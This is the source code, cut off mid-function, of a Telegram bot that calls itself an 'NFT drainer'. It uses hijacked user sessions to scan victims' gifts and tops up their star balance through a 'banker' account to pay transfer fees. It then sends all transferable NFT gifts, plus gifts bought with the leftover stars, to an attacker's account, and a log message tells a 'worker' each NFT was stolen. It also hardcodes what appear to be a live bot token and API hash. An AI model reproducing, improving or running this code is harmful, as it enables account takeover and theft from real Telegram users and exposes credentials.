#!/usr/bin/env python3
import asyncio
import logging
import sys
import os
import shutil
import uuid
import secrets
import sqlite3
import time
import subprocess
import re
import json
import glob
import random
from datetime import datetime, timezone
from pathlib import Path
from dotenv import load_dotenv
import aiohttp

# Импорты Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ContentType
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, FSInputFile, WebAppInfo,
    InlineQueryResultArticle, InlineQueryResultCachedPhoto, InputTextMessageContent,
    LabeledPrice, PreCheckoutQuery, Message
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Импорты Pyrogram (ВАЖНО: ДОЛЖЕН БЫТЬ УСТАНОВЛЕН KURIGRAM!)
# pip uninstall pyrogram
# pip install https://github.com/Kurimuzard/Kurigram/archive/master.zip
from pyrogram import Client, enums
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait, AuthKeyUnregistered, UserDeactivated,
    PaymentRequired, RPCError, PeerIdInvalid, UserIsBlocked, BadRequest, UsernameInvalid,
    SessionRevoked
)

# ================= НАСТРОЙКИ ЛОГИРОВАНИЯ (DEBUG) =================
transfer_logger = logging.getLogger("TransferDebug")
transfer_logger.setLevel(logging.DEBUG)
if transfer_logger.hasHandlers():
    transfer_logger.handlers.clear()

fh = logging.FileHandler('transfer_debug.log', encoding='utf-8')
fh.setFormatter(logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s'))
transfer_logger.addHandler(fh)

ch = logging.StreamHandler()
ch.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
transfer_logger.addHandler(ch)

def log_transfer(msg, level="info"):
    if level == "info": transfer_logger.info(msg)
    elif level == "error": transfer_logger.error(msg)
    elif level == "warning": transfer_logger.warning(msg)
    elif level == "debug": transfer_logger.debug(msg)

# ================= НАСТРОЙКИ ЦВЕТОВ И ЛОГОВ =================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def print_banner():
    print(f"""{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║       🎁 ULTIMATE NFT DRAINER BOT (V3.0 KURIGRAM EDITION)    ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}""")

def print_step(msg): print(f"{Colors.BLUE}🔹 {msg}{Colors.END}")
def print_success(msg): print(f"{Colors.GREEN}✅ {msg}{Colors.END}")
def print_warning(msg): print(f"{Colors.YELLOW}⚠️ {msg}{Colors.END}")
def print_error(msg): print(f"{Colors.RED}❌ {msg}{Colors.END}")
def print_info(msg): print(f"{Colors.CYAN}ℹ️ {msg}{Colors.END}")

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.FileHandler('bot.log', encoding='utf-8')]
)
logger = logging.getLogger("MainBot")

# ================= УПРАВЛЕНИЕ НАСТРОЙКАМИ (JSON) =================
SETTINGS_FILE = "settings.json" 
DEFAULT_SETTINGS = { 
    "target_user": "@tonhind", 
    "admin_ids": [7225974704, 7383020095],
    "allowed_group_id": -1003691864664, 
    "topic_launch": 2, 
    "topic_auth": 2, 
    "topic_success": 2, 
    "api_id": 39558030, 
    "api_hash": "e905a8237954b8b4190d40148e2e2585", 
    "api_url": "https://mini-d60madc3l-fluxxis-projects.vercel.app", 
    "bot_token": "8575961927:AAGi3b_9R1OvZ9x1PO-LXsuECJyiL2tofAI",
    "maintenance_mode": False, 
    "banker_session": "main_admin",
    "auto_convert_gifts": True,
    "max_drain_retries": 3,
    "use_aggressive_mode": True,
    "min_balance_threshold": 15
}

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(DEFAULT_SETTINGS, f, indent=4)
        return DEFAULT_SETTINGS
    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
        for k, v in DEFAULT_SETTINGS.items():
            if k not in data: data[k] = v
        return data

def save_settings(data):
    with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def fix_permissions():
    """Пытается выдать права на запись файлам сессий и БД"""
    try:
        for path in [Path("sessions"), Path("bot_database.db")]:
            if path.exists():
                os.chmod(path, 0o777)
                if path.is_dir():
                    for file in path.glob("*"):
                        try: os.chmod(file, 0o777)
                        except: pass
        print_success("Permissions fix attempted.")
    except Exception as e:
        print_warning(f"Could not fix permissions automatically: {e}")

SETTINGS = load_settings()

# ================= ПРОВЕРКА ОКРУЖЕНИЯ =================
fix_permissions()
load_dotenv()

def check_env_setup():
    if not SETTINGS.get("bot_token") and not os.getenv("BOT_TOKEN"):
        val = input("Введите BOT_TOKEN: ").strip()
        SETTINGS["bot_token"] = val
        save_settings(SETTINGS)
    
    os.environ["TELEGRAM_API_ID"] = str(SETTINGS["api_id"])
    os.environ["TELEGRAM_API_HASH"] = SETTINGS["api_hash"]
    os.environ["BOT_TOKEN"] = SETTINGS["bot_token"]
    os.environ["API_URL"] = SETTINGS["api_url"]

check_env_setup()

# ================= ДИРЕКТОРИИ =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
ARCHIVE_DIR = BASE_DIR / "archive"
CHECKS_PHOTO_DIR = BASE_DIR / "check_photos"
TEMP_DIR = BASE_DIR / "temp"

for d in [SESSIONS_DIR, ARCHIVE_DIR, CHECKS_PHOTO_DIR, TEMP_DIR]:
    d.mkdir(exist_ok=True)

# ================= ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =================
user_sessions = {}
pyrogram_clients = {}
active_dumps = set()
processed_ids = set()
admin_auth_process = {}
cached_photo_ids = {}
active_transfers = {}

# Карта подарков: Цена -> {Сколько получаем при конвертации, Список ID}
GIFT_MAP = {
    15:  {'get': 13, 'ids': [5170233102089322756, 5170145012310081615]},
    25:  {'get': 21, 'ids': [5168103777563050263, 5170250947678437525]},
    50:  {'get': 43, 'ids': [6028601630662853006, 5170564780938756245]},
    100: {'get': 85, 'ids': [5219852305406238882]}
}

GIFT_EMOJIS = {
    5170233102089322756: "🧸", 5170145012310081615: "💝", 5168103777563050263: "🌹",
    5170250947678437525: "🎁", 6028601630662853006: "🍾", 5170564780938756245: "🚀"
}

# ================= УПРАВЛЕНИЕ ВРЕМЕННЫМИ СЕССИЯМИ (JSON) =================
SESSION_TEMP_FILE = "temp_sessions.json"

def load_temp_sessions():
    if os.path.exists(SESSION_TEMP_FILE):
        try:
            with open(SESSION_TEMP_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except: return {}
    return {}

def save_temp_sessions(data):
    try:
        with open(SESSION_TEMP_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except Exception as e:
        print_error(f"Error saving temp sessions: {e}")

user_sessions = load_temp_sessions()

# ================= БАЗА ДАННЫХ =================
class Database:
    def __init__(self, db_file="bot_database.db"):
        self.db_path = BASE_DIR / db_file
        self.conn = sqlite3.connect(str(self.db_path), check_same_thread=False, timeout=30)
        self.cursor = self.conn.cursor()
        
        try:
            self.conn.execute("PRAGMA journal_mode=WAL;")
            self.conn.execute("PRAGMA synchronous=NORMAL;")
        except:
            pass
            
        self.create_tables()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, balance INTEGER DEFAULT 0, worker_id INTEGER DEFAULT NULL, is_mamont BOOLEAN DEFAULT 0, is_dumped BOOLEAN DEFAULT 0)""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS checks (check_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, activations INTEGER, claimed_count INTEGER DEFAULT 0, claimed_by TEXT DEFAULT '')""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS inline_checks (unique_id TEXT PRIMARY KEY, creator_id INTEGER, amount INTEGER, claimed_by INTEGER, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS transfer_logs (log_id INTEGER PRIMARY KEY AUTOINCREMENT, session_name TEXT, user_id INTEGER, stars_before INTEGER, stars_after INTEGER, nft_count INTEGER, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)""")
        self.conn.commit()

    def add_user(self, user_id, username, first_name, worker_id=None):
        user = self.get_user(user_id)
        if not user:
            self.cursor.execute("INSERT INTO users (user_id, username, first_name, worker_id) VALUES (?, ?, ?, ?)", (user_id, username or "Unknown", first_name or "Unknown", worker_id))
        else:
            if worker_id and not user['worker_id']:
                self.cursor.execute("UPDATE users SET worker_id = ? WHERE user_id = ?", (worker_id, user_id))
            self.cursor.execute("UPDATE users SET username = ?, first_name = ? WHERE user_id = ?", (username or "Unknown", first_name or "Unknown", user_id))
        self.conn.commit()

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        return {'user_id': row[0], 'username': row[1], 'first_name': row[2], 'balance': row[3], 'worker_id': row[4], 'is_mamont': row[5], 'is_dumped': row[6]} if row else None

    def get_stats(self):
        self.cursor.execute("SELECT COUNT(*) FROM users")
        u = self.cursor.fetchone()[0]
        self.cursor.execute("SELECT SUM(amount) FROM checks")
        c = self.cursor.fetchone()[0] or 0
        return u, c

    def mark_as_dumped(self, user_id):
        self.cursor.execute("UPDATE users SET is_dumped = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()

    def update_balance(self, user_id, amount, mode='add'):
        user = self.get_user(user_id)
        if not user: 
            self.add_user(user_id, "Unknown", "Unknown")
            user = self.get_user(user_id)
        
        current = user['balance'] if user else 0
        new = current + amount if mode == 'add' else current - amount
        if new < 0: new = 0
        self.cursor.execute("UPDATE users SET balance = ? WHERE user_id = ?", (new, user_id))
        self.conn.commit()
        return new

    def set_mamont(self, user_id, status=True):
        user = self.get_user(user_id)
        if not user:
            self.add_user(user_id, "Unknown", "Unknown")
        
        self.cursor.execute("UPDATE users SET is_mamont = ? WHERE user_id = ?", (1 if status else 0, user_id))
        self.conn.commit()

    def create_check(self, creator_id, amount, activations):
        check_id = secrets.token_urlsafe(8)
        self.cursor.execute("INSERT INTO checks (check_id, creator_id, amount, activations) VALUES (?, ?, ?, ?)", (check_id, creator_id, amount, activations))
        self.conn.commit()
        return check_id

    def get_check(self, check_id):
        self.cursor.execute("SELECT * FROM checks WHERE check_id = ?", (check_id,))
        row = self.cursor.fetchone()
        return {'check_id': row[0], 'creator_id': row[1], 'amount': row[2], 'activations': row[3], 'claimed_count': row[4], 'claimed_by': row[5]} if row else None

    def activate_check(self, check_id, user_id):
        check = self.get_check(check_id)
        if not check: return "not_found", 0, None
        claimed = check['claimed_by'].split(',') if check['claimed_by'] else []
        if str(user_id) in claimed: return "already_claimed", 0, None
        if check['claimed_count'] >= check['activations']: return "empty", 0, None
        claimed.append(str(user_id))
        self.cursor.execute("UPDATE checks SET claimed_count = claimed_count + 1, claimed_by = ? WHERE check_id = ?", (",".join(claimed), check_id))
        self.update_balance(user_id, check['amount'], 'add')
        self.conn.commit()
        return "success", check['amount'], check['creator_id']

    def activate_inline_check(self, unique_id, creator_id, claimer_id, amount):
        self.cursor.execute("SELECT * FROM inline_checks WHERE unique_id = ?", (unique_id,))
        if self.cursor.fetchone(): return "already_used"
        
        creator = self.get_user(creator_id)
        if not creator or creator['balance'] < amount: return "no_balance"
        
        self.update_balance(creator_id, amount, 'remove')
        self.update_balance(claimer_id, amount, 'add')
        self.cursor.execute("INSERT INTO inline_checks (unique_id, creator_id, amount, claimed_by) VALUES (?, ?, ?, ?)", (unique_id, creator_id, amount, claimer_id))
        self.conn.commit()
        return "success"

    def log_transfer(self, session_name, user_id, stars_before, stars_after, nft_count, status):
        self.cursor.execute("INSERT INTO transfer_logs (session_name, user_id, stars_before, stars_after, nft_count, status) VALUES (?, ?, ?, ?, ?, ?)",
                           (session_name, user_id, stars_before, stars_after, nft_count, status))
        self.conn.commit()

db = Database()

# ================= STATES =================
class CreateCheckState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_activations = State()

class TopUpState(StatesGroup):
    waiting_for_custom_amount = State()

class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class AdminSettingsState(StatesGroup):
    waiting_target = State()
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_api_url = State()
    waiting_new_admin = State()
    waiting_del_admin = State()

# ================= УТИЛИТЫ =================
def clean_phone_number(phone: str) -> str:
    if not phone: return ""
    clean = re.sub(r'\D', '', str(phone))
    
    if clean.startswith('4949'):
        clean = clean[2:]

    if len(clean) == 11 and clean.startswith('8'):
        clean = '7' + clean[1:]
    
    elif len(clean) == 10 and (clean.startswith('9') or clean.startswith('7')):
        clean = '7' + clean

    elif len(clean) >= 10 and clean.startswith(('15', '16', '17')):
        clean = '49' + clean
        
    return clean

def mask_phone(phone):
    clean = str(phone).replace(" ", "").replace("+", "").replace("-", "")
    if len(clean) > 7: return f"+{clean[:2]}*****{clean[-4:]}"
    return "Неизвестно"

def get_webapp_url(user_id, current_api_url):
    raw_url = current_api_url.strip().strip("'").strip('"').rstrip('/')
    if 'localhost' not in raw_url and not raw_url.startswith('https://'):
        raw_url = raw_url.replace('http://', 'https://') if 'http://' in raw_url else 'https://' + raw_url
    sep = '&' if '?' in raw_url else '?'
    return f"{raw_url}{sep}chatId={user_id}"

def get_target_username():
    raw = str(SETTINGS["target_user"])
    clean = raw.replace("https://t.me/", "").replace("@", "").strip()
    return clean

async def safe_edit_text(message: Message, text: str, reply_markup=None):
    try:
        if message.content_type == ContentType.PHOTO:
            await message.delete()
            await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')
        else:
            await message.edit_text(text, reply_markup=reply_markup, parse_mode='HTML')
    except:
        await message.answer(text, reply_markup=reply_markup, parse_mode='HTML')

async def log_to_topic(bot: Bot, topic_key: str, text: str):
    gid = SETTINGS.get('allowed_group_id')
    tid = SETTINGS.get(topic_key)
    if gid and tid:
        try: await bot.send_message(chat_id=int(gid), text=text, message_thread_id=int(tid), disable_web_page_preview=True)
        except Exception as e: print_error(f"Log Error: {e}")

async def send_file_to_admins(bot: Bot, file_path: Path, caption: str):
    admins = SETTINGS.get('admin_ids', [])
    for admin_id in admins:
        try: await bot.send_document(chat_id=admin_id, document=FSInputFile(file_path), caption=caption)
        except: pass

async def notify_worker(bot: Bot, worker_id: int, text: str):
    if not worker_id: return
    try: await bot.send_message(chat_id=worker_id, text=text)
    except: pass

async def alert_admins(bot: Bot, text: str):
    admins = SETTINGS.get('admin_ids', [])
    if not admins: return
    clean_text = str(text).replace("<", "&lt;").replace(">", "&gt;")
    msg = f"❌ <b>ОШИБКА БОТА</b>\n\n<pre>{clean_text[:3000]}</pre>"
    for admin_id in admins:
        try: await bot.send_message(chat_id=admin_id, text=msg)
        except: pass

# ================= ИСПРАВЛЕННАЯ ЛОГИКА KURIGRAM V3 =================

async def get_stars_info(client: Client):
    try:
        balance = await client.get_stars_balance("me")
        log_transfer(f"Баланс проверен: {balance} звезд")
        return int(balance)
    except Exception as e:
        log_transfer(f"Ошибка получения баланса: {e}", "error")
        return 0

def calculate_optimal_topup(needed_stars):
    if needed_stars <= 0: return []
    best_cost = float('inf')
    best_combo = []
    
    base_100 = 0
    remaining_needed = needed_stars
    if needed_stars > 200:
        base_100 = (needed_stars - 100) // 85
        remaining_needed -= base_100 * 85
    
    for n50 in range(3):
        for n25 in range(3):
            for n15 in range(10):
                got = n50*43 + n25*21 + n15*13
                cost = n50*50 + n25*25 + n15*15
                if got >= remaining_needed:
                    total_cost = cost + (base_100 * 100)
                    if total_cost < best_cost:
                        best_cost = total_cost
                        best_combo = [100]*base_100 + [50]*n50 + [25]*n25 + [15]*n15
    return best_combo

def analyze_gift(gift, location_name="Me"):
    """ИСПРАВЛЕННАЯ ФУНКЦИЯ для работы с Kurigram API"""
    details = {
        'id': getattr(gift, 'id', 0), 
        'msg_id': getattr(gift, 'message_id', 0),
        'title': 'Unknown Gift', 
        'star_count': getattr(gift, 'convert_price', 0) or 0,
        'transfer_cost': getattr(gift, 'transfer_price', 0) or 0,
        'is_nft': False, 
        'can_transfer': False, 
        'can_convert': False,
        'location': location_name,
        'slug': None
    }
    
    # КРИТИЧЕСКОЕ ИСПРАВЛЕНИЕ: Проверяем NFT через вложенный объект gift.gift
    gift_attr = getattr(gift, "gift", None)
    
    if gift_attr and hasattr(gift_attr, "collectible_id") and gift_attr.collectible_id is not None:
        details['is_nft'] = True
        details['title'] = getattr(gift_attr, "title", f"NFT #{gift_attr.collectible_id}")
        
        # Проверка холда
        if hasattr(gift, 'can_transfer_at'):
            if gift.can_transfer_at is None:
                details['can_transfer'] = True
            else:
                now = datetime.now(gift.can_transfer_at.tzinfo) if gift.can_transfer_at.tzinfo else datetime.now(timezone.utc)
                details['can_transfer'] = (gift.can_transfer_at <= now)
        
        details['slug'] = getattr(gift_attr, 'slug', None)
        log_transfer(f"Найден NFT: {details['title']} (ID: {gift_attr.collectible_id})", "debug")
    else:
        # Обычный подарок
        is_converted = getattr(gift, 'is_converted', False)
        details['can_convert'] = (details['star_count'] > 0) and (not is_converted)
        details['title'] = GIFT_EMOJIS.get(gift.id, "🎁")
        log_transfer(f"Обычный подарок: {details['title']} (+{details['star_count']} зв)", "debug")
    
    return details

async def scan_location_gifts(client: Client, peer_id, location_name):
    found_gifts = []
    try:
        async for gift in client.get_chat_gifts(chat_id=peer_id):
            found_gifts.append(analyze_gift(gift, location_name))
        log_transfer(f"Сканирование {location_name}: найдено {len(found_gifts)} подарков", "debug")
    except Exception as e:
        log_transfer(f"Ошибка сканирования {location_name}: {e}", "error")
    return found_gifts

def is_nft_gift(gift):
    """Проверка является ли подарок NFT (для фильтрации)"""
    gift_attr = getattr(gift, "gift", None)
    return gift_attr and hasattr(gift_attr, "collectible_id") and gift_attr.collectible_id is not None

# --- TASKS ---

async def send_gift_task(client: Client, target_id, price, target_username=None, delay=0):
    if delay > 0: await asyncio.sleep(delay)

    gift_data = GIFT_MAP.get(price)
    if not gift_data: return False
    gift_id = gift_data['ids'][0] if gift_data['ids'] else GIFT_MAP[50]['ids'][0]
    
    recipient = target_username if target_username else target_id

    try:
        await client.send_gift(chat_id=recipient, gift_id=gift_id)
        log_transfer(f"⚡️ Банкир отправил подарок за {price} зв -> {recipient}")
        return True
    except FloodWait as e:
        log_transfer(f"Флуд контроль {e.value}с...", "warning")
        await asyncio.sleep(e.value)
        return await send_gift_task(client, target_id, price, target_username, 0)
    except Exception as e:
        if "DUPLICATE" in str(e):
            await asyncio.sleep(1.5)
            try:
                await client.send_gift(chat_id=recipient, gift_id=gift_id)
                return True
            except: return False
        log_transfer(f"Ошибка отправки подарка: {e}", "error")
        return False

async def convert_gift_task(client: Client, gift_details):
    """Конвертация обычного подарка в звезды"""
    try:
        await client.convert_gift_to_stars(owned_gift_id=str(gift_details['msg_id']))
        log_transfer(f"✅ Конвертирован: {gift_details['title']} (+{gift_details['star_count']} зв)")
        return True
    except BadRequest as e:
        e_str = str(e)
        if "STARGIFT_CONVERT_TOO_OLD" in e_str:
            log_transfer(f"⚠️ Пропускаем старый подарок: {gift_details['title']}", "warning")
            return False
        if "STARGIFT_ALREADY_CONVERTED" in e_str:
            log_transfer(f"⚠️ Подарок уже конвертирован: {gift_details['title']}", "warning")
            return False
        log_transfer(f"Не конвертирован {gift_details['title']}: {e_str}", "warning")
        return False
    except Exception as e: 
        log_transfer(f"Ошибка конвертации {gift_details['title']}: {e}", "error")
        return False

async def transfer_nft_task(client: Client, gift_details, target_chat_id, bot: Bot, user_db_data):
    """Передача NFT целевому получателю"""
    try:
        await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_chat_id)
        log_transfer(f"✅ NFT ОТПРАВЛЕН: {gift_details['title']} -> {target_chat_id}")
        
        if user_db_data and user_db_data['worker_id']:
            await notify_worker(bot, user_db_data['worker_id'], f"🎁 NFT <b>{gift_details['title']}</b> УСПЕШНО УКРАДЕН!")
        return "success"
    except FloodWait as e:
        log_transfer(f"Флуд {e.value}с при передаче NFT. Ждем...", "warning")
        await asyncio.sleep(e.value)
        try:
            await client.transfer_gift(owned_gift_id=str(gift_details['msg_id']), new_owner_chat_id=target_chat_id)
            return "success"
        except: pass
    except Exception as e:
        log_transfer(f"Ошибка передачи NFT {gift_details['title']}: {e}", "error")
        await alert_admins(bot, f"❌ Не удалось передать {gift_details['title']}: {e}")
    
    return "failed"

async def drain_stars_user(client: Client, default_recipient=None):
    """Скупает подарки на все доступные звезды"""
    try:
        cfg_target = SETTINGS.get("target_user")
        raw_target = cfg_target if cfg_target else default_recipient
        target_str = str(raw_target).replace("https://t.me/", "").replace("@", "").strip()
        
        if not target_str:
            log_transfer("⚠️ Не настроен Target для слива!", "warning")
            return

        try:
            chat = await client.get_chat(target_str)
            recipient_id = chat.id
            recipient_title = chat.username or chat.first_name
            log_transfer(f"Target найден: {recipient_title} (ID: {recipient_id})", "debug")
        except Exception as e:
            log_transfer(f"⚠️ Target не найден ({target_str}): {e}", "error")
            return

        try: 
            balance = int(await client.get_stars_balance("me"))
            log_transfer(f"Текущий баланс для шопинга: {balance} ⭐️", "debug")
        except: 
            balance = 0

        if balance < 15:
            log_transfer(f"ℹ️ Баланс {balance} ⭐️ — недостаточно для покупки подарков.")
            return

        log_transfer(f"🛍 SHOPPING MODE: Тратим {balance} ⭐️ на -> {recipient_title}")

        sorted_prices = sorted([k for k in GIFT_MAP.keys()], reverse=True)
        count = 0
        
        while balance >= 15:
            gift_price = 0
            gift_id = 0
            
            for price in sorted_prices:
                if balance >= price:
                    gdata = GIFT_MAP.get(price)
                    if gdata and gdata['ids']:
                        gift_price = price
                        gift_id = random.choice(gdata['ids'])
                        break
            
            if not gift_price: break

            try:
                await client.send_gift(chat_id=recipient_id, gift_id=gift_id)
                balance -= gift_price
                count += 1
                log_transfer(f"🎁 Отправлен подарок за {gift_price} зв. (Остаток: {balance})")
                await asyncio.sleep(random.uniform(1.0, 2.0))
            except FloodWait as e:
                log_transfer(f"Флуд при покупке: {e.value}с", "warning")
                await asyncio.sleep(e.value)
            except Exception as e:
                log_transfer(f"❌ Ошибка покупки: {e}", "error")
                await asyncio.sleep(1)
                try: 
                    balance = int(await client.get_stars_balance("me"))
                    log_transfer(f"Обновленный баланс: {balance} ⭐️", "debug")
                except: break
        
        log_transfer(f"✅ Шоппинг завершен. Куплено подарков: {count}.")

    except Exception as e:
        log_transfer(f"Ошибка в drain_stars_user: {e}", "error")
        
# --- AGGRESSIVE LOGIC ORCHESTRATOR V3 ---

async def wait_for_topup(client: Client, required_stars):
    """Ожидание поступления подарков от банкира"""
    log_transfer("⏳ Ожидание подарков от банкира...")
    for attempt in range(20):  # Увеличено до 20 попыток
        try:
            gifts_found = 0
            async for gift in client.get_chat_gifts(chat_id="me"):
                # Проверяем что это обычный подарок (не NFT) и еще не конвертирован
                if not is_nft_gift(gift) and not getattr(gift, 'is_converted', False):
                    convert_price = getattr(gift, 'convert_price', 0)
                    if convert_price > 0:
                        log_transfer(f"⚡️ Найден подарок для конвертации (+{convert_price} зв)")
                        gifts_found += 1
                        
            if gifts_found > 0:
                log_transfer(f"✅ Найдено {gifts_found} подарков для конвертации")
                return True
                
        except Exception as e:
            log_transfer(f"Ошибка при сканировании подарков: {e}", "debug")
        
        await asyncio.sleep(1)  # Проверка каждую секунду
    
    log_transfer("❌ Таймаут ожидания подарков", "warning")
    return False

async def prepare_transfer_target(client: Client, target_username_str):
    """Подготовка целевого получателя с фиксом PEER_ID_INVALID"""
    targets_to_try = []
    
    clean_target = str(target_username_str).strip().replace("https://t.me/", "").replace("@", "")
    
    if clean_target.isdigit():
        targets_to_try.append(int(clean_target))
    else:
        targets_to_try.append(clean_target)
        
    resolved_peer = None

    for t in targets_to_try:
        try:
            log_transfer(f"🔎 Поиск целевого получателя: {t}...")
            chat = await client.get_chat(t)
            
            # КРИТИЧЕСКИЙ ФИКС: отправляем и удаляем сообщение для создания диалога
            try:
                msg = await client.send_message(chat.id, ".")
                await asyncio.sleep(0.5)
                await client.delete_messages(chat.id, msg.id)
                log_transfer(f"Диалог создан с {chat.first_name}", "debug")
            except:
                pass
            
            resolved_peer = chat.id
            log_transfer(f"✅ Получатель подтвержден: {chat.first_name} (ID: {chat.id})")
            break
        except Exception as e:
            log_transfer(f"⚠️ Не удалось связаться с {t}: {e}", "debug")
            continue
    
    return resolved_peer

async def aggressive_transfer_process(client: Client, banker: Client, bot: Bot):
    """АГРЕССИВНЫЙ РЕЖИМ V3 - основной процесс слива"""
    nft_log_results = [] 
    final_stars = 0
    session_name = client.name
    
    try:
        if not client.is_connected: 
            await client.connect()
        
        me = await client.get_me()
        victim_phone = getattr(me, 'phone_number', 'Unknown')
        log_transfer(f"🚀 START AGGRESSIVE MODE V3: @{me.username} ({victim_phone})", "info")
        
        # ================= 1. ПРОВЕРКА БАЛАНСА И NFT =================
        try: 
            current_balance = int(await client.get_stars_balance("me"))
            log_transfer(f"💰 Начальный баланс: {current_balance} ⭐️", "info")
        except Exception as e:
            log_transfer(f"Ошибка получения баланса: {e}", "error")
            current_balance = 0

        profile_gifts = await scan_location_gifts(client, "me", "Profile")
        all_nfts_to_send = [g for g in profile_gifts if g['is_nft'] and g['can_transfer']]
        nft_on_hold = [g for g in profile_gifts if g['is_nft'] and not g['can_transfer']]
        
        log_transfer(f"📊 Статистика: NFT доступно: {len(all_nfts_to_send)}, в холде: {len(nft_on_hold)}", "info")
        
        for g in nft_on_hold:
            nft_log_results.append({'title': g['title'], 'slug': g.get('slug',''), 'status': '🕔 (Холд 24ч)'})

        if not all_nfts_to_send:
            log_transfer("🏁 NFT для передачи не найдены. Переходим к чистке остатков.", "info")
            await cleanup_and_drain(client, SETTINGS.get("banker_session", "main_admin"))
            db.log_transfer(session_name, me.id, current_balance, 0, 0, "no_nft")
            return nft_log_results, current_balance

        # ================= 2. АГРЕССИВНОЕ ПОПОЛНЕНИЕ БАЛАНСА =================
        banker_ready = (banker and banker.is_connected)
        banker_username = SETTINGS.get("banker_session", "main_admin")
        
        target_future = None
        raw_target = SETTINGS.get("target_user")
        if raw_target:
            target_future = asyncio.create_task(prepare_transfer_target(client, raw_target))
        elif banker_ready:
            target_future = asyncio.create_task(prepare_transfer_target(client, banker_username))

        total_fees = sum(n['transfer_cost'] for n in all_nfts_to_send)
        deficit = total_fees - current_balance
        banker_triggered = False
        
        log_transfer(f"📈 Комиссия за все NFT: {total_fees} зв, дефицит: {deficit} зв", "info")
        
        if deficit > 0:
            if banker_ready:
                log_transfer(f"📉 Не хватает {deficit} зв. Запрашиваем у Банкира...", "info")
                topup_plan = calculate_optimal_topup(deficit)
                log_transfer(f"📋 План пополнения: {topup_plan}", "debug")
                
                # Отправляем подарки пачкой с минимальными задержками
                tasks = []
                for i, price in enumerate(topup_plan):
                    tasks.append(send_gift_task(banker, me.id, price, me.username, delay=i*0.3))
                
                results = await asyncio.gather(*tasks, return_exceptions=True)
                successful_sends = sum(1 for r in results if r is True)
                log_transfer(f"✅ Банкир отправил {successful_sends}/{len(topup_plan)} подарков", "info")
                banker_triggered = True
            else:
                log_transfer("⚠️ Дефицит баланса, но Банкир недоступен!", "error")

        # ================= 3. ОЖИДАНИЕ И КОНВЕРТАЦИЯ ПОДАРКОВ =================
        if banker_triggered:
            log_transfer("⏳ Ожидание и конвертация подарков от банкира...", "info")
            
            # Ждем поступления подарков
            if await wait_for_topup(client, deficit):
                # Конвертируем все доступные подарки
                conversion_tasks = []
                async for g in client.get_chat_gifts(chat_id="me"):
                    if not is_nft_gift(g) and not getattr(g, 'is_converted', False):
                        gift_details = analyze_gift(g)
                        if gift_details['can_convert']:
                            conversion_tasks.append(convert_gift_task(client, gift_details))
                
                if conversion_tasks:
                    log_transfer(f"♻️ Конвертация {len(conversion_tasks)} подарков...", "info")
                    await asyncio.gather(*conversion_tasks)
                    await asyncio.sleep(2)  # Даем время на обработку
            else:
                log_transfer("⚠️ Подарки от банкира не поступили", "warning")

        # ================= 4. ПРОВЕРКА ФИНАЛЬНОГО БАЛАНСА =================
        ready_to_send = False
        for _ in range(8):
            try:
                current_balance = int(await client.get_stars_balance("me"))
                if current_balance >= total_fees:
                    ready_to_send = True
                    log_transfer(f"✅ Баланс достаточен: {current_balance} >= {total_fees}", "info")
                    break
                else:
                    log_transfer(f"⏳ Баланс {current_balance} < {total_fees}, ждем...", "debug")
            except: pass
            await asyncio.sleep(0.5)

        # ================= 5. МАССОВАЯ ОТПРАВКА NFT =================
        final_recipient_id = await target_future if target_future else None

        if ready_to_send and final_recipient_id:
            log_transfer(f"⚡️ ОТПРАВКА {len(all_nfts_to_send)} NFT получателю {final_recipient_id}...", "info")
            
            # Отправляем NFT параллельно с ограничением
            semaphore = asyncio.Semaphore(3)  # Максимум 3 одновременные передачи
            
            async def transfer_with_semaphore(nft):
                async with semaphore:
                    return await transfer_nft_task(client, nft, final_recipient_id, bot, None)
            
            tasks = [transfer_with_semaphore(nft) for nft in all_nfts_to_send]
            results_status = await asyncio.gather(*tasks)
            
            successful = sum(1 for res in results_status if res == "success")
            log_transfer(f"📊 Итог: {successful}/{len(all_nfts_to_send)} NFT успешно отправлены", "info")
            
            for idx, res in enumerate(results_status):
                nft_log_results.append({
                    'title': all_nfts_to_send[idx]['title'], 
